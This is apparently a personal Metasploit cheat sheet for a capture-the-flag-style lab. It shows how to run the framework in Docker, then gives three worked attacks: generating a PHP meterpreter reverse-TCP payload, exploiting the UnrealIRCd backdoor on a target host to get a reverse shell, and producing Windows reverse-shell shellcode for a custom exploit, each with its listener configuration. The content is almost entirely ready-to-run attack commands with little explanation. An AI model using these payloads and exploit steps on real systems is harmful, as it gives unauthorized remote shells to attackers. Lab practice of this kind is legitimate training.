#### 1. About

- URL: `github.com/rapid7/metasploit-framework`
- metasploit framework


#### 2. Setup and run
```
# docker pull metasploitframework/metasploit-framework
# docker tag metasploitframework/metasploit-framework:latest msf
# ip=`ip a | grep tun0 | grep inet | awk '{print $2}' | sed 's/\/.*//g'`
# docker run --name msf -e ip=$ip -v /tmp:/tmp -p 4000-4010:4000-4010 -d --rm -it msf
# [[ -z `grep masfvenom ~/.profile` ]] && echo 'alias msfvenom="docker exec -it msf /usr/src/metasploit-framework/msfvenom"' >> ~/.profile
# [[ -z `grep msfconsole ~/.profile` ]] && echo 'alias msfconsole="docker exec -it msf /usr/src/metasploit-framework/msfconsole"' >> ~/.profile
```


#### 3. Example 1
```
# msfvenom -p php/meterpreter/reverse_tcp LHOST=$ip LPORT=4001 R -o /tmp/msf/payload.php
# cat << EOF > /tmp/shell.rc
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.10.14.25
set LPORT 4001
exploit
EOF
# msfconsole -qr /tmp/shell.rc
```


#### 4. Example 2
```
# cat << EOF > /tmp/exploit.rc
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.10.10.117
set RPORT 6697
set PAYLOAD cmd/unix/reverse
set LHOST 10.10.14.25
set LPORT 4001
exploit
EOF
# msfconsole -qr /tmp/exploit.rc
```


#### 5. Example 3 (custom exploit)
```
# docker run --name msf -v /tmp:/tmp -p 4000-4010:4000-4010 -d --rm -it msf
# msfvenom -p windows/shell_reverse_tcp LHOST=172.16.201.160 LPORT=4001 EXITFUNC=thread -b '\x00\x0a\x0d' -f python -v buffer
# cat << EOF > /tmp/handler.rc
use exploit/multi/handler
set PAYLOAD windows/shell_reverse_tcp
set EXITFUNC thread
set LHOST 172.16.201.160
set LPORT 4001
exploit
EOF
# msfconsole -qr /tmp/handler.rc
```
